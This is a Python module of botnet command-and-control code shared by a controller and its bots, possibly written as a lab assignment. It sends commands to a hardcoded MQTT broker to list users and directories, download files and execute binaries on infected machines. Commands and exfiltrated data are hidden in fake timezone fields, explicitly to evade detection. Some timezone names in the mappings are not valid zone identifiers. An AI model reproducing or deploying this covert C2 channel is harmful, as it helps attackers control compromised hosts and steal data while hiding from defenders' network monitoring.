# Common code for both controller and bot
# Implements steganography-based C&C communication using timezone data as a covert channel
# Messages are disguised as timezone data to evade detection

from dataclasses import dataclass, field
from typing import Optional
from datetime import datetime
from zoneinfo import ZoneInfo
from paho.mqtt import client as mqtt
import random
import base64
import json

# MQTT broker configuration for C&C communication
MQTT_BROKER = "147.32.82.209"
MQTT_PORT = 1883
MQTT_TOPIC = "sensors"

# Commands
CMD_LIST_BOTS = 1
CMD_LIST_USERS = 2
CMD_LIST_DIR = 3
CMD_GET_USER_ID = 4
CMD_DOWNLOAD_FILE = 5
CMD_EXECUTE_BINARY = 6

COMMAND_TO_TIMEZONE = {
    CMD_LIST_BOTS: "America/New_York",
    CMD_LIST_USERS: "America/Los_Angeles",
    CMD_LIST_DIR: "America/Chicago",
    CMD_GET_USER_ID: "Europe/London",
    CMD_DOWNLOAD_FILE: "Europe/Paris",
    CMD_EXECUTE_BINARY: "Europe/Berlin",
}

TIMEZONE_TO_ACTION = {v.upper(): k for k, v in COMMAND_TO_TIMEZONE.items()}

CHAR_TO_TIMEZONE = {
    "a": "America/Argentina/Buenos_Aires",
    "b": "America/Sao_Paulo",
    "c": "America/Toronto",
    "d": "Europe/Dublin",
    "e": "Europe/Madrid",
    "f": "Europe/Paris",
    "g": "Europe/Athens",
    "h": "Europe/Helsinki",
    "i": "Asia/Jerusalem",
    "j": "Asia/Kolkata",
    "k": "Asia/Kathmandu",
    "l": "America/Lima",
    "m": "Europe/Moscow",
    "n": "America/Denver",
    "o": "Australia/Sydney",
    "p": "America/Phoenix",
    "q": "America/Montevideo",
    "r": "America/Recife",
    "s": "America/Santiago",
    "t": "America/Taipei",
    "u": "Australia/Perth",
    "v": "America/Vancouver",
    "w": "America/Winnipeg",
    "x": "Asia/Ho_Chi_Minh",
    "y": "Asia/Yekaterinburg",
    "z": "Europe/Stockholm",
    "A": "America/Anchorage",
    "B": "Europe/Berlin",
    "C": "America/Chicago",
    "D": "Asia/Dubai",
    "E": "Europe/Edinburgh",
    "F": "America/Fortaleza",
    "G": "Europe/Gibraltar",
    "H": "Pacific/Honolulu",
    "I": "Asia/Istanbul",
    "J": "Asia/Jakarta",
    "K": "Europe/Kiev",
    "L": "Europe/London",
    "M": "America/Mexico_City",
    "N": "America/New_York",
    "O": "Europe/Oslo",
    "P": "Europe/Prague",
    "Q": "America/Quebec",
    "R": "Europe/Rome",
    "S": "Asia/Shanghai",
    "T": "Asia/Tokyo",
    "U": "Asia/Ulaanbaatar",
    "V": "Europe/Vienna",
    "W": "Europe/Warsaw",
    "X": "America/Cancun",
    "Y": "America/Yakutat",
    "Z": "Europe/Zurich",
    ",": "Africa/Johannesburg",
    " ": "Africa/Lagos",
    ".": "Africa/Kenya",
    "/": "America/Los_Angeles",
    "~": "Europe/Tallinn",
    "0": "UTC",
    "1": "Africa/Casablanca",
    "2": "Africa/Cairo",
    "3": "Africa/Nairobi",
    "4": "Asia/Baku",
    "5": "Asia/Karachi",
    "6": "Asia/Dhaka",
    "7": "Asia/Bangkok",
    "8": "Asia/Singapore",
    "9": "Asia/Seoul",
}

# Reverse mapping for decoding timezones back to characters
TIMEZONE_TO_CHAR = {v.upper(): k for k, v in CHAR_TO_TIMEZONE.items()}

@dataclass
class RequestMessage:
    """
    Base message format for C&C communication.
    Disguised as timezones information.
    Fields serve dual purposes legitimate-looking data + covert C&C channel.
    """
    # Legitimate datetime to make message appear benign
    local_datetime: str = field(default_factory=lambda: datetime.now().isoformat()) 

    device_id: Optional[str] = None           # Bot ID (disguised as device ID)
    datetime_leap: Optional[str] = None       # Encrypted message for large payloads
    timezones: Optional[list[str]] = None     # Obfuscated message for small payloads
    timezone: Optional[str] = None            # Command code (only controller sends this)
    
    @classmethod
    def from_json(cls, json_str: str):
        """
        Deserialize JSON message into RequestMessage object.
        Raises UnknownDeviceError if format doesn't match (not from our C&C network).
        """
        try:
            data = json.loads(json_str)
            return cls(**data)
        except Exception:
            # If we can't deserialize, it's not from our C&C network
            raise UnknownDeviceError()
    
    def to_json(self) -> str:
        """
        Serialize message to JSON, including only non-None fields.
        """
        json_obj = {}
        if self.local_datetime is not None:
            json_obj["local_datetime"] = self.local_datetime
        if self.device_id is not None:
            json_obj["device_id"] = self.device_id
        if self.datetime_leap is not None:
            json_obj["datetime_leap"] = self.datetime_leap
        if self.timezones is not None:
            json_obj["timezones"] = self.timezones
        if self.timezone is not None:
            json_obj["timezone"] = self.timezone
        return json.dumps(json_obj)
    
    def get_user_action(self):
        """
        Decode the controller command from the timezone field.
        Returns the controller command code (1-6) or None if no valid command found.
        """
        if self.timezone is None:
            return None
        action_timezone = self.timezone.upper()
        if action_timezone not in TIMEZONE_TO_ACTION:
            # Unknown timezone - not a valid command
            return None
        return TIMEZONE_TO_ACTION[action_timezone]
    
    def set_device_id(self, fake_device_id: str):
        """
        Set the bot ID in the message.
        !!! The ID is disguised as a legitimate device identifier. !!!
        """
        self.device_id = fake_device_id

    def set_user_action(self, user_action: int):
        """
        Encode a controller command as a timezone in the message.
        Also sets the local_datetime to match that timezone for authenticity.
        """
        if user_action not in COMMAND_TO_TIMEZONE:
            raise Exception(f"Timezone is missing for action number {user_action}")
        # Encode command as a timezone string
        self.timezone = COMMAND_TO_TIMEZONE[user_action]

        try:
            # Set datetime in that timezone to make message look legitimate
            now_utc = datetime.now(ZoneInfo("UTC"))
            self.local_datetime = now_utc.astimezone(ZoneInfo(self.timezone)).isoformat()
        except Exception:
            # Ignore error, use any datetime
            self.local_datetime = datetime.now().isoformat()

    def get_message(self):
        """
        Extract and decode the hidden message from the request.
        Automatically detects and uses the appropriate decoding method.
        """
        if self.datetime_leap is not None:
            return decrypt(self.datetime_leap)
        if self.timezones is not None:
            return deobfuscate(self.timezones)
        return None
    
    def set_message(self, message: str | None):
        """
        Hide a message in the request using steganography.
        Short messages (<=100 chars) use timezone obfuscation.
        Long messages use base64 encryption distributed across timezone chunks.
        """
        self.datetime_leap = None
        self.timezones = None
        
        if message is None:
            return
        if len(message) <= 100:
            self.timezones = obfuscate(message)
        else:
            self.datetime_leap = encrypt(message)

@dataclass
class ControllerMessage:
    """
    Parsed command message from the controller.
    Contains the action to execute and optional path parameter.
    """
    user_action: int                # Command code (1-6)
    path: Optional[str] = None      # Optional path for file/directory operations

    @classmethod
    def from_request(cls, request: RequestMessage):
        """
        Parse a controller command from a RequestMessage.
        Validates that the message contains a valid command.
        """
        if request.timezone is None:
            raise UnknownDeviceError()
        
        # Extract the command code from the timezone field
        user_action = request.get_user_action()
        if user_action is None:
            # No valid action means not from our controller
            raise UnknownDeviceError()
        
        # Extract optional path parameter from hidden message
        path = request.get_message()
        
        return cls(user_action=user_action, path=path)

@dataclass
class BotMessage:
    """
    Parsed response message from a bot.
    Contains the bot's ID and its response data.
    """
    device_id: Optional[str]    # Bot identifier
    message: Optional[str]      # Command execution result

    @classmethod
    def from_request(cls, request: RequestMessage):
        """
        Parse a bot response from a RequestMessage.
        Validates that it's a bot response (not a controller command).
        """
        # Bot responses should not contain command codes
        if request.get_user_action() is not None:
            raise UnknownDeviceError()

        device_id = request.device_id
        message = request.get_message()

        # Must have at least bot ID or message
        if device_id is None and message is None:
            raise UnknownDeviceError()

        return cls(device_id=device_id, message=message)
        

def encrypt(text: str):
    """
    Encrypt text by encoding as base64 and distributing chunks across timezone keys.
    Used for longer messages that exceed obfuscation character limit.
    
    Process:
    1. Base64 encode the text
    2. Split into random-sized chunks (7-20 chars)
    3. Map chunks to timezone keys in a JSON object
    4. Return JSON string that looks like timezone configuration data
    """
    # Base64 encode the message
    encoded = base64.b64encode(text.encode('utf-8')).decode('utf-8')
    
    # Use all available timezones as potential keys
    timezones = list(CHAR_TO_TIMEZONE.values())
    
    # Split encoded message into random-sized chunks for obfuscation
    chunks = []
    i = 0
    while i < len(encoded):
        chunk_size = random.randint(7, 20)
        chunks.append(encoded[i:i+chunk_size])
        i += chunk_size
    
    # Distribute chunks across timezone keys, cycling through available timezones
    result = {}
    for idx, chunk in enumerate(chunks):
        timezone = timezones[idx % len(timezones)]
        if timezone not in result:
            result[timezone] = []
        result[timezone].append(chunk)
    
    return json.dumps(result)


def decrypt(encrypted_json: str):
    """
    Decrypt message that was hidden using encrypt() function.
    Reconstructs chunks in correct order and decodes from base64.
    
    Process:
    1. Parse JSON to get timezone-to-chunks mapping
    2. Reconstruct chunks in original order by cycling through timezones
    3. Concatenate chunks and base64 decode
    """
    data = json.loads(encrypted_json)
    
    # Get the list of timezones used for chunk distribution
    timezones = list(CHAR_TO_TIMEZONE.values())
    
    # Reconstruct chunks in the order they were distributed
    chunks = []
    timezone_idx = 0
    chunk_counts = {tz: 0 for tz in timezones}  # Track chunks extracted per timezone
    
    # Cycle through timezones collecting chunks in original order
    while True:
        current_tz = timezones[timezone_idx % len(timezones)]
        
        # If this timezone has more chunks to extract, get the next one
        if current_tz in data and chunk_counts[current_tz] < len(data[current_tz]):
            chunks.append(data[current_tz][chunk_counts[current_tz]])
            chunk_counts[current_tz] += 1
            timezone_idx += 1
        else:
            # Check if we've collected all chunks from all timezones
            all_collected = all(
                tz not in data or chunk_counts[tz] == len(data[tz])
                for tz in timezones
            )
            if all_collected:
                break
            timezone_idx += 1
            
        # Safety check to prevent infinite loops
        if timezone_idx > 10000:
            break
    
    # Reconstruct the base64 string and decode to original text
    encoded = ''.join(chunks)
    decoded = base64.b64decode(encoded).decode('utf-8')
    return decoded

def obfuscate(message: str) -> list[str]:
    """
    Obfuscate a short message by encoding each character as a timezone.
    Used for messages <=100 characters.
    
    Each character is replaced with its corresponding timezone from CHAR_TO_TIMEZONE.
    Unknown characters default to space timezone (Africa/Lagos).
    Results in a list that looks like legitimate timezone data.
    """
    obfuscated = []
    for char in message:
        if char in CHAR_TO_TIMEZONE:
            obfuscated.append(CHAR_TO_TIMEZONE[char])
        else: # Character not in dictionary - use space as fallback
            obfuscated.append(CHAR_TO_TIMEZONE[' '])
    return obfuscated

def deobfuscate(obfuscated_msg: list[str]) -> str:
    """
    Decode a message that was obfuscated using obfuscate() function.
    Converts list of timezones back to original text.
    """
    deobfuscated = []
    for tz in obfuscated_msg:
        if tz.upper() in TIMEZONE_TO_CHAR:
            deobfuscated.append(TIMEZONE_TO_CHAR[tz.upper()])
    return ''.join(deobfuscated)

class UnknownDeviceError(Exception):
    """
    Exception raised when a message is received from an unrecognized device.
    Used to filter out non-C&C traffic and maintain operational security.
    """
    pass